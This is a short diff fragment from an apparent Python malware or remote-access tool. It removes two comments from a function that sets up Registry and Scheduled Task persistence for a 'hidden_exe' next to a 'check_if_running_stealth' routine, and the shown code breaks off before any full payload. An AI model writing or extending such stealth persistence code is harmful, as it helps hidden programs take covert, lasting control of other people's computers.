@@ -24,7 +24,6 @@ def check_if_running_stealth():
 
 def setup_persistence(hidden_exe):
     """Set up persistence via Registry and Scheduled Task."""
-    # Registry persistence
     try:
         import winreg
         registry_locations = [
@@ -41,7 +40,6 @@ def setup_persistence(hidden_exe):
     except ImportError:
         pass
     
-    # Scheduled Task persistence
     task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
